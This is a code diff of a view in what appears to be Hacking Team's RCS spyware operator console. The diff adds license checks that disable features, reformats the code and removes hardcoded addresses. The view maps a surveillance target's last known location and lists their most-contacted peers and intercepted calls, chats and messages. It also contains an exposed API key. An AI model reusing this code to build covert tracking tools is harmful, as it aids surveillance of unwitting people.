@@ -28,40 +28,40 @@
   </fx:Metadata>
 	<fx:Script>
 		<![CDATA[
-      import com.google.maps.LatLng;
-      import com.google.maps.LatLngBounds;
-      import com.google.maps.Map;
-      import com.google.maps.MapType;
-      import com.google.maps.controls.MapTypeControl;
-      import com.google.maps.controls.PositionControl;
-      import com.google.maps.controls.ZoomControl;
-      import com.google.maps.interfaces.IOverlay;
-      import com.google.maps.interfaces.IPane;
-      import com.google.maps.overlays.GroundOverlay;
-      import com.google.maps.overlays.GroundOverlayOptions;
-      import com.google.maps.overlays.Marker;
-      import com.google.maps.PaneId;
-      
-      import it.ht.rcs.console.DB;
-      import it.ht.rcs.console.entities.controller.EntityManager;
-      import it.ht.rcs.console.entities.model.Contact;
-      import it.ht.rcs.console.entities.model.Entity;
-      import it.ht.rcs.console.events.RefreshEvent;
-      import it.ht.rcs.console.events.SectionEvent;
-      import it.ht.rcs.console.monitor.controller.LicenseManager;
-      import it.ht.rcs.console.search.controller.SearchManager;
-      import it.ht.rcs.console.utils.AlertPopUp;
-      import it.ht.rcs.console.utils.Clock;
-      import it.ht.rcs.console.utils.TimeUtils;
-      
-      import locale.R;
-      
-      import mx.collections.ArrayCollection;
-      import mx.core.FlexGlobals;
-      import mx.events.CloseEvent;
-      import mx.managers.PopUpManager;
-      import mx.rpc.events.FaultEvent;
-      import mx.rpc.events.ResultEvent;
+			import com.google.maps.LatLng;
+			import com.google.maps.LatLngBounds;
+			import com.google.maps.Map;
+			import com.google.maps.MapType;
+			import com.google.maps.controls.MapTypeControl;
+			import com.google.maps.controls.PositionControl;
+			import com.google.maps.controls.ZoomControl;
+			import com.google.maps.interfaces.IOverlay;
+			import com.google.maps.interfaces.IPane;
+			import com.google.maps.overlays.GroundOverlay;
+			import com.google.maps.overlays.GroundOverlayOptions;
+			import com.google.maps.overlays.Marker;
+			import com.google.maps.PaneId;
+
+			import it.ht.rcs.console.DB;
+			import it.ht.rcs.console.entities.controller.EntityManager;
+			import it.ht.rcs.console.entities.model.Contact;
+			import it.ht.rcs.console.entities.model.Entity;
+			import it.ht.rcs.console.events.RefreshEvent;
+			import it.ht.rcs.console.events.SectionEvent;
+			import it.ht.rcs.console.monitor.controller.LicenseManager;
+			import it.ht.rcs.console.search.controller.SearchManager;
+			import it.ht.rcs.console.utils.AlertPopUp;
+			import it.ht.rcs.console.utils.Clock;
+			import it.ht.rcs.console.utils.TimeUtils;
+
+			import locale.R;
+
+			import mx.collections.ArrayCollection;
+			import mx.core.FlexGlobals;
+			import mx.events.CloseEvent;
+			import mx.managers.PopUpManager;
+			import mx.rpc.events.FaultEvent;
+			import mx.rpc.events.ResultEvent;
 
 			[Bindable]
 			private var accounts:ArrayCollection;
@@ -74,20 +74,20 @@
 
 			[Bindable]
 			private var mostContacted:ArrayCollection;
-      
-      //Styling
-      private var circleFillColor:uint=0xFF0000;
-      private var circleFillAlpha:Number=0.2;
-      private var circleBorderTickness:int=0.2;
-      private var circleBorderFillColor:uint=0xFF0000;
-      private var circleBorderFillAlpha:Number=0.5;
-      
-      private var mapPane:IPane;
-      private var scale:Number;
-      private var centre:LatLng;
-      private var circleOverlay:IOverlay;
-      private var mapReady:Boolean;
-      private var overlays:Array=new Array();
+
+			//Styling
+			private var circleFillColor:uint=0xFF0000;
+			private var circleFillAlpha:Number=0.2;
+			private var circleBorderTickness:int=0.2;
+			private var circleBorderFillColor:uint=0xFF0000;
+			private var circleBorderFillAlpha:Number=0.5;
+
+			private var mapPane:IPane;
+			private var scale:Number;
+			private var centre:LatLng;
+			private var circleOverlay:IOverlay;
+			private var mapReady:Boolean;
+			private var overlays:Array=new Array();
 
 			[Embed(source='/img/stub/fakeprofile.jpg')]
 			[Bindable]
@@ -131,17 +131,11 @@
 				}
 				else
 				{
-					contactsList.enabled=false; //TODO ADD A MESSAGE
+					if (contactsList)
+						contactsList.enabled=false; //TODO ADD A MESSAGE
+					if (loadingBox)
+						loadingBox.visible=loadingBox.includeInLayout=false;
 				}
-
-
-
-				locations=new ArrayCollection();
-				locations.addItem({label: "Via della Moscova 13, 20100 - Milano"})
-				//locations.addItem({label: "Corso di Porta Romana 2, 20100 - Milano"})
-				//locations.addItem({label: "Viale Andrea Doria 7, 20100 - Milano"})
-				//locations.addItem({label: "Piazza Cavour 1, 20100 - Milano"})
-
 				if (DB.instance.demo)
 				{
 					callLater(onRefresh, [null])
@@ -155,29 +149,30 @@
 				loadingBox.visible=loadingBox.includeInLayout=true;
 				EntityManager.instance.mostContacted(entity._id, formatDate(fromDate), formatDate(toDate), "10", onContactResult, onContactFault);
 			}
-      
-     /*  private function adjust():void
-      {
-        var fromTS:int = getFromTimestamp();
-        var toTS:int = getToTimestamp();
-        
-        if (fromTS > toTS)
-          setToTimestamp(fromTS);
-      } */
-      
-      private function getFromTimestamp():int
-      {
-        fromDf.selectedDate.hours = 0;
-        fromDf.selectedDate.minutes = 0;
-        return Clock.instance.toUTCTime(fromDf.selectedDate) / 1000;
-      }
-      private function getToTimestamp():int
-      {
-        toDf.selectedDate.hours = 0;
-        toDf.selectedDate.minutes = 0;
-        return Clock.instance.toUTCTime(toDf.selectedDate) / 1000;
-      }
-  
+
+			/*  private function adjust():void
+			 {
+				 var fromTS:int = getFromTimestamp();
+				 var toTS:int = getToTimestamp();
+
+				 if (fromTS > toTS)
+					 setToTimestamp(fromTS);
+			 } */
+
+			private function getFromTimestamp():int
+			{
+				fromDf.selectedDate.hours=0;
+				fromDf.selectedDate.minutes=0;
+				return Clock.instance.toUTCTime(fromDf.selectedDate) / 1000;
+			}
+
+			private function getToTimestamp():int
+			{
+				toDf.selectedDate.hours=0;
+				toDf.selectedDate.minutes=0;
+				return Clock.instance.toUTCTime(toDf.selectedDate) / 1000;
+			}
+
 
 
 			private function doubleDigits(n:Number):String
@@ -194,105 +189,115 @@
 
 			private function onMapReady(event:Event):void
 			{
-        mapReady=true;
+				if (LicenseManager.instance.correlation)
+				{
+					mapReady=true;
 
-        map.addControl(new ZoomControl());
-        map.addControl(new PositionControl());
-        map.addControl(new MapTypeControl())
-        
-        //range error
-        
-        mapPane=map.getPaneManager().getPaneAt(PaneId.PANE_MAP);
-        
-        //map.addEventListener(MapZoomEvent.ZOOM_CHANGED, onMapZoomed);
-       
-        dispatchEvent(new Event("ready"));
-        if(entity) drawPosition()
+					map.addControl(new ZoomControl());
+					map.addControl(new PositionControl());
+					map.addControl(new MapTypeControl())
 
-			
+					//range error
+
+					mapPane=map.getPaneManager().getPaneAt(PaneId.PANE_MAP);
+
+					//map.addEventListener(MapZoomEvent.ZOOM_CHANGED, onMapZoomed);
+
+					dispatchEvent(new Event("ready"));
+					if (entity)
+						drawPosition()
+
+				}
+				else
+				{
+					lastPositionTxt.text="Last known Position  (Feature not included in current License)"
+				}
 			}
-      
-      private function calculateMapScale():Number
-      {
-        var topLeft:LatLng;
-        var bottomLeft:LatLng;
-        var scale:Number;
-        var distance:Number;
-        
-        topLeft=mapPane.fromPaneCoordsToLatLng(new Point(0, 0));
-        bottomLeft=mapPane.fromPaneCoordsToLatLng(new Point(0, map.height));
-        distance=topLeft.distanceFrom(bottomLeft) / 1000;
-        scale=map.height / distance;
-        
-        return scale;
-      }
-      
-      private function drawCircle(radiusKm:Number, position:LatLng):LatLngBounds
-      {
-        if (isNaN(radiusKm) || radiusKm <= 0)
-        {
-          //return new LatLngBounds();
-          radiusKm=0.02
-        }
-        
-        scale=calculateMapScale();
-        var shape:Shape=new Shape();
-        var overlay:GroundOverlay;
-        var bounds:LatLngBounds;
-        var centrePoint:Point;
-        var topLeft:LatLng;
-        var bottomRight:LatLng;
-        var options:GroundOverlayOptions;
-        var circleWidth:Number=radiusKm * 2 * scale;
-        
-        shape.graphics.lineStyle(circleBorderTickness, circleBorderFillColor, circleBorderFillAlpha);
-        shape.graphics.beginFill(circleFillColor, circleFillAlpha);
-        shape.graphics.drawCircle(circleWidth * .5, circleWidth * .5, circleWidth);
-        shape.graphics.endFill();
-        centrePoint=mapPane.fromLatLngToPaneCoords(position);
-        topLeft=mapPane.fromPaneCoordsToLatLng(new Point(centrePoint.x - circleWidth * .5, centrePoint.y - circleWidth * .5));
-        bottomRight=mapPane.fromPaneCoordsToLatLng(new Point(centrePoint.x + circleWidth * .5, centrePoint.y + circleWidth * .5));
-        bounds=new LatLngBounds(topLeft, bottomRight);
-        options=new GroundOverlayOptions();
-        options.applyProjection=true;
-        circleOverlay=new GroundOverlay(shape, bounds, options);
-        map.addOverlay(circleOverlay);
-        overlays.push(circleOverlay);
 
-        
-        
-        return bounds
-      }
-      
-      private function drawPosition():void
-      {
-        //remove overlays
-        for (var i:int=0; i < overlays.length; i++)
-        {
-          map.removeOverlay(overlays[i] as IOverlay);
-        }
-        if(entity.position.latitude && entity.position.longitude)
-        {
-          var coordinates:LatLng=new LatLng(Number(entity.position.latitude), Number(entity.position.longitude));
-          var bounds:LatLngBounds=new LatLngBounds();
-          var centre:LatLng=new LatLng(coordinates.lat(), coordinates.lng());
-          map.setCenter(centre, 14, MapType.NORMAL_MAP_TYPE);
-          bounds.extend(coordinates);
-          var circleBounds:LatLngBounds=drawCircle(Number(entity.position_attr.accuracy) / 1000, coordinates);
-          bounds.union(circleBounds)
-          var marker:Marker=new Marker(coordinates);
-          map.addOverlay(marker);
-          overlays.push(marker);
-          map.setCenter(bounds.getCenter(), map.getBoundsZoomLevel(bounds));
-          lastPositionTxt.text=R.get('LAST_KNOWN_POSITION')+"( "+TimeUtils.timestampFormatter(entity.position_attr.time*1000)+" ): Latitude: "+entity.position.latitude+", Longitude: "+entity.position.longitude+", Accuracy: "+entity.position_attr.accuracy+" mt";
-          trace(TimeUtils.timestampFormatter(entity.position_attr.time*1000));
-        }
-        else
-        {
-          lastPositionTxt.text="Last position unkown"
-          map.setZoom(1)
-        }
-      }
+			private function calculateMapScale():Number
+			{
+				var topLeft:LatLng;
+				var bottomLeft:LatLng;
+				var scale:Number;
+				var distance:Number;
+
+				topLeft=mapPane.fromPaneCoordsToLatLng(new Point(0, 0));
+				bottomLeft=mapPane.fromPaneCoordsToLatLng(new Point(0, map.height));
+				distance=topLeft.distanceFrom(bottomLeft) / 1000;
+				scale=map.height / distance;
+
+				return scale;
+			}
+
+			private function drawCircle(radiusKm:Number, position:LatLng):LatLngBounds
+			{
+				if (isNaN(radiusKm) || radiusKm <= 0)
+				{
+					//return new LatLngBounds();
+					radiusKm=0.02
+				}
+
+				scale=calculateMapScale();
+				var shape:Shape=new Shape();
+				var overlay:GroundOverlay;
+				var bounds:LatLngBounds;
+				var centrePoint:Point;
+				var topLeft:LatLng;
+				var bottomRight:LatLng;
+				var options:GroundOverlayOptions;
+				var circleWidth:Number=radiusKm * 2 * scale;
+
+				shape.graphics.lineStyle(circleBorderTickness, circleBorderFillColor, circleBorderFillAlpha);
+				shape.graphics.beginFill(circleFillColor, circleFillAlpha);
+				shape.graphics.drawCircle(circleWidth * .5, circleWidth * .5, circleWidth);
+				shape.graphics.endFill();
+				centrePoint=mapPane.fromLatLngToPaneCoords(position);
+				topLeft=mapPane.fromPaneCoordsToLatLng(new Point(centrePoint.x - circleWidth * .5, centrePoint.y - circleWidth * .5));
+				bottomRight=mapPane.fromPaneCoordsToLatLng(new Point(centrePoint.x + circleWidth * .5, centrePoint.y + circleWidth * .5));
+				bounds=new LatLngBounds(topLeft, bottomRight);
+				options=new GroundOverlayOptions();
+				options.applyProjection=true;
+				circleOverlay=new GroundOverlay(shape, bounds, options);
+				map.addOverlay(circleOverlay);
+				overlays.push(circleOverlay);
+
+
+
+				return bounds
+			}
+
+			private function drawPosition():void
+			{
+				if (LicenseManager.instance.correlation)
+				{
+					//remove overlays
+					for (var i:int=0; i < overlays.length; i++)
+					{
+						map.removeOverlay(overlays[i] as IOverlay);
+					}
+					if (entity.position.latitude && entity.position.longitude)
+					{
+						var coordinates:LatLng=new LatLng(Number(entity.position.latitude), Number(entity.position.longitude));
+						var bounds:LatLngBounds=new LatLngBounds();
+						var centre:LatLng=new LatLng(coordinates.lat(), coordinates.lng());
+						map.setCenter(centre, 14, MapType.NORMAL_MAP_TYPE);
+						bounds.extend(coordinates);
+						var circleBounds:LatLngBounds=drawCircle(Number(entity.position_attr.accuracy) / 1000, coordinates);
+						bounds.union(circleBounds)
+						var marker:Marker=new Marker(coordinates);
+						map.addOverlay(marker);
+						overlays.push(marker);
+						map.setCenter(bounds.getCenter(), map.getBoundsZoomLevel(bounds));
+						lastPositionTxt.text=R.get('LAST_KNOWN_POSITION') + "( " + TimeUtils.timestampFormatter(entity.position_attr.time * 1000) + " ): Latitude: " + entity.position.latitude + ", Longitude: " + entity.position.longitude + ", Accuracy: " + entity.position_attr.accuracy + " mt";
+						trace(TimeUtils.timestampFormatter(entity.position_attr.time * 1000));
+					}
+					else
+					{
+						lastPositionTxt.text="Last position unkown"
+						map.setZoom(1)
+					}
+				}
+			}
 
 			private function onUpdate(e:Event):void
 			{
@@ -361,11 +366,7 @@
 					contactsList.enabled=false; //TODO ADD A MESSAGE
 				}
 
-				locations=new ArrayCollection();
-				locations.addItem({label: "Via della Moscova 13, 20100 - Milano"});
-				//locations.addItem({label: "Corso di Porta Romana 2, 20100 - Milano"})
-				//locations.addItem({label: "Viale Andrea Doria 7, 20100 - Milano"})
-				//locations.addItem({label: "Piazza Cavour 1, 20100 - Milano"})
+
 			}
 
 
@@ -378,7 +379,7 @@
 					descTxt.text=entity.desc;
 				if (photoViewer)
 					photoViewer.currentIndex=0;
-        
+
 				if (entity.photos)
 				{
 					if (entity.photos.length > 0)
@@ -400,8 +401,8 @@
 				if (handlesList)
 					handlesList.dataProvider=entity.handles;
 
-        if(mapReady)
-          drawPosition();
+				if (mapReady)
+					drawPosition();
 				//dispatchEvent(new Event("update"));
 			}
 
@@ -424,22 +425,22 @@
 
 			private function jumpToEvidence(e:Event):void
 			{
-				if(contactsList.selectedItem)
-        {
-          var item:Contact=contactsList.selectedItem as Contact;
-          
-          var event:SectionEvent=new SectionEvent(SectionEvent.CHANGE_SECTION);
-          event.section=SectionEvent.OPERATIONS;
-          event.subsection='evidence';
-          
-          var targetId:String=entity.path[entity.path.length - 1];
-          event.item=SearchManager.instance.getItem(targetId);
-          event.evidenceTypes=["call", "chat", "message"];
-          event.info=String(item.peer + " " + item.type);
-          event.from = getFromTimestamp();
-          event.to = getToTimestamp();
-          FlexGlobals.topLevelApplication.dispatchEvent(event);
-        }
+				if (contactsList.selectedItem)
+				{
+					var item:Contact=contactsList.selectedItem as Contact;
+
+					var event:SectionEvent=new SectionEvent(SectionEvent.CHANGE_SECTION);
+					event.section=SectionEvent.OPERATIONS;
+					event.subsection='evidence';
+
+					var targetId:String=entity.path[entity.path.length - 1];
+					event.item=SearchManager.instance.getItem(targetId);
+					event.evidenceTypes=["call", "chat", "message"];
+					event.info=String(item.peer + " " + item.type);
+					event.from=getFromTimestamp();
+					event.to=getToTimestamp();
+					FlexGlobals.topLevelApplication.dispatchEvent(event);
+				}
 
 			}
 
@@ -469,20 +470,25 @@
 			<s:HGroup verticalAlign="middle"
 								horizontalAlign="right"
 								width="100%">
-				<s:Label text="Filter data "
-								 fontWeight="bold"/>
-				<s:Label text="from:"
-								 fontWeight="bold"/>
+				<s:Label text="{R.get('FILTER_DATA')} "
+								 fontWeight="bold"
+								 alpha="{LicenseManager.instance.correlation? 1:0.5}"/>
+				<s:Label text="{R.get('FROM')}:"
+								 fontWeight="bold"
+								 alpha="{LicenseManager.instance.correlation? 1:0.5}"/>
 				<mx:DateField id="fromDf"
 											selectedDate="{fromDate}"
 											change="filter()"
-											formatString="YYYY-MM-DD"/>
-				<s:Label text="to:"
-								 fontWeight="bold"/>
+											formatString="YYYY-MM-DD"
+											enabled="{LicenseManager.instance.correlation}"/>
+				<s:Label text="{R.get('TO')}:"
+								 fontWeight="bold"
+								 alpha="{LicenseManager.instance.correlation? 1:0.5}"/>
 				<mx:DateField id="toDf"
 											selectedDate="{toDate}"
 											change="filter()"
-											formatString="YYYY-MM-DD"/>
+											formatString="YYYY-MM-DD"
+											enabled="{LicenseManager.instance.correlation}"/>
 			</s:HGroup>
 		</s:HGroup>
 
@@ -549,11 +555,19 @@
 
 			<s:HGroup width="100%"
 								verticalAlign="middle">
-				<s:Label text="Most Contacted:"
-								 fontWeight="bold"/>
+				<s:Label text="{R.get('MOST_CONTACTED')}"
+								 fontWeight="bold"
+								 alpha="{LicenseManager.instance.correlation? 1:0.5}"/>
+				<s:Label text=" (Feature not included in current License)"
+								 visible="{!LicenseManager.instance.correlation}"
+								 includeInLayout="{!LicenseManager.instance.correlation}"
+								 fontWeight="bold"
+								 alpha="0.5"/>
 				<s:Spacer width="100%"/>
 				<s:HGroup verticalAlign="middle"
-									id="loadingBox">
+									id="loadingBox"
+									visible="{LicenseManager.instance.correlation}"
+									includeInLayout="{LicenseManager.instance.correlation}">
 
 					<s:SWFLoader source="@Embed('/img/evidence/spinner16.swf')"/>
 					<s:Label text="Retrieving data..."
@@ -563,6 +577,7 @@
 			<s:List width="100%"
 							height="100%"
 							id="contactsList"
+							enabled="{LicenseManager.instance.correlation}"
 							itemRenderer="it.ht.rcs.console.entities.view.ContactListRenderer"
 							dataProvider="{mostContacted}"
 							doubleClickEnabled="true"
@@ -589,12 +604,13 @@
 				</s:layout>
 				<s:HGroup width="100%"
 									horizontalAlign="left">
-          <s:Label id="lastPositionTxt"/>
-				<!--	<s:CheckBox label="Last Positions"/>
-					<s:Spacer width="10"/>
-					<s:CheckBox label="Addresses"/>
-					<s:Spacer width="10"/>
-					<s:CheckBox label="Visited Places"/>-->
+					<s:Label id="lastPositionTxt"
+									 alpha="{LicenseManager.instance.correlation? 1:0.5}"/>
+					<!--	<s:CheckBox label="Last Positions"/>
+						<s:Spacer width="10"/>
+						<s:CheckBox label="Addresses"/>
+						<s:Spacer width="10"/>
+						<s:CheckBox label="Visited Places"/>-->
 				</s:HGroup>
 				<s:VGroup paddingBottom="0"
 									paddingTop="0"
@@ -615,7 +631,16 @@
 											key="ABQIAAAA8fmTpYQsyimBWFWKgeE9PBRhMg83CBLwD9y4vh6Mu8HzQS3H_RRayLm54B1SF17x6N9sYwYVwJV_FQ"
 											url="http://www.hackingteam.it/"
 											sensor="false"
-											accessibilityDescription=""/>
+											accessibilityDescription=""
+											enabled="{LicenseManager.instance.correlation}"/>
+						<!-- trick to disbale map -->
+						<s:BorderContainer width="100%"
+															 height="100%"
+															 borderAlpha="0"
+															 backgroundColor="0xFFFFFF"
+															 backgroundAlpha="0.5"
+															 visible="{!LicenseManager.instance.correlation}"
+															 includeInLayout="{!LicenseManager.instance.correlation}"/>
 					</s:BorderContainer>
 					<!--<s:Spacer height="6"/>
 					<s:List width="100%"
